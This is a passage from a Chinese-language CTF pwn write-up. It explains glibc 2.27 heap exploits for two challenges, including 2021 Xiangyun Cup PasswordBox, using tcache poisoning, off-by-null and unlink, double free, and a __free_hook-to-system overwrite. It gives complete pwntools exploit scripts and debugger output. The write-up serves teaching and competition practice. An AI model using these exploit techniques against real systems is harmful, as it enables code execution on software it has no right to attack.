<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; hex 0x55c37c076000 2000</span><br><span class="line">+0000 0x55c37c076000  00 00 00 00  00 00 00 00  51 02 00 00  00 00 00 00  │....│....│Q...│....│</span><br><span class="line">+0010 0x55c37c076010  00 00 00 02  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">+0020 0x55c37c076020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+0060 0x55c37c076060  00 00 00 00  00 00 00 00  a0 62 07 7c  c3 55 00 00  │....│....│.b.|│.U..│</span><br><span class="line">+0070 0x55c37c076070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+0250 0x55c37c076250  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │....│....│!...│....│</span><br><span class="line">+0260 0x55c37c076260  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">+0270 0x55c37c076270  61 61 61 61  61 61 61 61  71 00 00 00  00 00 00 00  │aaaa│aaaa│q...│....│</span><br><span class="line">+0280 0x55c37c076280  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">+0290 0x55c37c076290  00 00 00 00  00 00 00 00  51 00 00 00  00 00 00 00  │....│....│Q...│....│</span><br><span class="line">+02a0 0x55c37c0762a0  30 63 07 7c  c3 55 00 00  10 60 07 7c  c3 55 00 00  │0c.|│.U..│.`.|│.U..│</span><br><span class="line">+02b0 0x55c37c0762b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+02e0 0x55c37c0762e0  00 00 00 00  00 00 00 00  41 00 00 00  00 00 00 00  │....│....│A...│....│</span><br><span class="line">+02f0 0x55c37c0762f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+0320 0x55c37c076320  00 00 00 00  00 00 00 00  51 00 00 00  00 00 00 00  │....│....│Q...│....│</span><br><span class="line">+0330 0x55c37c076330  00 00 00 00  00 00 00 00  10 60 07 7c  c3 55 00 00  │....│....│.`.|│.U..│</span><br><span class="line">+0340 0x55c37c076340  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+0370 0x55c37c076370  00 00 00 00  00 00 00 00  91 0c 02 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">+0380 0x55c37c076380  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x50 [  2]: 0x55c37c0762a0 —&gt; 0x55c37c076330 &lt;— 0x0</span><br></pre></td></tr></table></figure>
<p>泄露堆地址，利用heap_addr计算出存储0x90大小的tacahe bin count的位置以及0x50大小的tacahe bin在tacahe struct中的位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x330</span></span><br><span class="line">tacahe_addr = heap + <span class="number">0x68</span></span><br><span class="line">count0x90 = heap + <span class="number">0x17</span></span><br></pre></td></tr></table></figure>
<p>Step3 泄露libc</p>
<p>泄露libc的思路就是将0x90大小的tacahe bin的conunt 改为 7 这样当我再释放下一个0x90大小的堆的时候他就会进入unsorted bin进而unsorted bin attack</p>
<p>在这之前先利用之前overlap修改 tcachebin fd 指针指向结构体，第二次申请就能申请到 tcache 结构体,从而修改数量tacahe count</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x51</span>)+p64(tacahe_addr))</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + <span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#4	</span></span><br><span class="line">edit(<span class="number">4</span>, p64(heap-<span class="number">0x319</span>)) <span class="comment">#任意地址写</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pwndbg&gt; bins</span></span><br><span class="line"><span class="string"># tcachebins</span></span><br><span class="line"><span class="string">0x50 [  0]: 0x558836a30017 &lt;— ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="string">&#x27;\x07&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>此时的0x90大小的tacahe count 已经被改成了7，接下来只要释放一个大小为0x90的chunk它就会进入unsorted bin</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br></pre></td></tr></table></figure>
<p>Step4: 利用之前的任意地址写修改__free_hook为system来getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">4</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2 </span></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br></pre></td></tr></table></figure>
<h3 id="exp-v6"><a class="header-anchor" href="#exp-v6">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;AAA&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;AAA&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;1.14.71.254&quot;,28051)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;E&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;D&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))   </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;S&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))   </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#1 0x21 </span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2 0x51</span></span><br><span class="line">add(<span class="number">0x38</span>) <span class="comment">#3 0x41</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#4 0x51</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x71&#x27;</span>)  <span class="comment">#chunk1 =&gt; 0x71</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">tacahe_addr = heap - <span class="number">0x2C8</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x51</span>)+p64(tacahe_addr))</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + <span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#4	</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, p64(heap-<span class="number">0x319</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="string">&#x27;\x07&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2 </span></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>p.s. 本题的flag在/home/ctf/flag.txt</p>
<h2 id="2021-祥云杯-PasswordBox-free-Version"><a class="header-anchor" href="#2021-祥云杯-PasswordBox-free-Version">¶</a>[2021 祥云杯]PasswordBox free Version</h2>
<h3 id="题目考点-v3"><a class="header-anchor" href="#题目考点-v3">¶</a>题目考点</h3>
<pre><code>1.异或算法
2.off by null
3.Unlink
4.glibc 2.27 -v1.4 double free
</code></pre>
<h3 id="功能分析"><a class="header-anchor" href="#功能分析">¶</a>功能分析</h3>
<p>add函数主要代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size &lt;= <span class="number">0x100</span> )</span><br><span class="line">&#123;</span><br><span class="line">  s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your Pwd:&quot;</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  fgets(s, size + <span class="number">1</span>, <span class="built_in">stdin</span>);                <span class="comment">// off by null</span></span><br><span class="line">  encrypt((__int64)s, size);</span><br><span class="line">  *((_DWORD *)&amp;lenarray + <span class="number">8</span> * SHIDWORD(size)) = size;</span><br><span class="line">  *((_QWORD *)&amp;heaparray + <span class="number">4</span> * SHIDWORD(size)) = s;</span><br><span class="line">  isAlive[<span class="number">8</span> * SHIDWORD(size)] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !ifFirst )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First Add Done.Thx 4 Use. Save ID:%s&quot;</span>, *((<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;heaparray + <span class="number">4</span> * SHIDWORD(size)));</span><br><span class="line">    ifFirst = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>fgets 存在off by null 可以让我们后面修改chunk的size</p>
<p>且输入的content会进行一次加密，加密函数如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">encrypt</span><span class="params">(__int64 note, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">2</span> * (a2 / <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a2 % <span class="number">16</span> &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 % <span class="number">16</span> &gt; <span class="number">0</span> )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_QWORD *)(<span class="number">8LL</span> * i + note) ^= key;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到是以八位为单位进行亦或操作，但是每次的key都是随机生成的，而由于获取我们输入的是fgets,当它读到&quot;\n&quot;且你输入的content小于size，就会将剩下的用0填充，由于0^key=key这样我们就能得到key了</p>
<p>edit函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !isFirst )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v1);</span><br><span class="line">    getchar();</span><br><span class="line">    isFirst = <span class="number">1LL</span>;</span><br><span class="line">    read(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;heaparray + <span class="number">4</span> * v1), <span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Because this is Free Version.The edit Function is Limit to use&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个堆，一生只能edit1次，且只能改0x10的大小</p>
<p>free和show都是正常的free和show</p>
<h3 id="解题步骤-v3"><a class="header-anchor" href="#解题步骤-v3">¶</a>解题步骤</h3>
<p>Step1: 获得key<br>
利用a ^ 0 = a的特性，得到key</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Save ID:&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br></pre></td></tr></table></figure>
<p>Step2:构造overlapped chunk leak libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#填满tacahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#0 (7)</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#1  (8)</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#2 (9)</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#3  (10)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>) </span><br><span class="line">free(<span class="number">7</span>)  <span class="comment">#free一个正常的chunk以便绕过Unlink检测</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64((<span class="number">0x80</span>+<span class="number">0x100</span>)^key)) <span class="comment">#size = chunk8 + chunk7</span></span><br><span class="line">free(<span class="number">9</span>)   <span class="comment">#unlink </span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;is: &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) ^ key </span><br><span class="line">libc_base -= <span class="number">0x3ebca0</span></span><br></pre></td></tr></table></figure>
<p>Step3:double free修改free_hook,注意在第二次free之前要修改标志位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">3</span>)   <span class="comment">#double free</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook^key))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system^key))</span><br><span class="line">add(<span class="number">0x60</span>,p64(binsh^key))</span><br><span class="line">free(<span class="number">5</span>) </span><br></pre></td></tr></table></figure>
<h3 id="EXP-v2"><a class="header-anchor" href="#EXP-v2">¶</a>EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;pwdFree&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwdFree&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input Your Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input The ID You Want Save:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Length Of Your Pwd:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Pwd:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input Your Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input Your Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Which PwdBox You Want Check:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input Your Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Idx you want 2 Delete:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Save ID:&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#0 (7)</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#1  (8)</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#2 (9)</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#3  (10)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>) </span><br><span class="line">free(<span class="number">7</span>)  <span class="comment"># -&gt;unsortdebin</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64((<span class="number">0x80</span>+<span class="number">0x100</span>)^key)) <span class="comment">#0</span></span><br><span class="line">free(<span class="number">9</span>)   <span class="comment">#unlink </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#overlap</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;is: &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) ^ key </span><br><span class="line">libc_base -= <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#one = [0x4f3d5,0x4f432,0x10a41c]</span></span><br><span class="line">binsh = u64(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#tacahe check bypass</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">3</span>)   <span class="comment">#double free</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook^key))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system^key))</span><br><span class="line">add(<span class="number">0x60</span>,p64(binsh^key))</span><br><span class="line">free(<span class="number">5</span>) </span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2021-PWN4"><a class="header-anchor" href="#CISCN-2021-PWN4">¶</a>[CISCN 2021]PWN4</h2>
<h3 id="题目解析"><a class="header-anchor" href="#题目解析">¶</a>题目解析</h3>
<p>具体见我前面UAF的文章</p>
<h3 id="exp-v7"><a class="header-anchor" href="#exp-v7">¶</a>exp</h3>
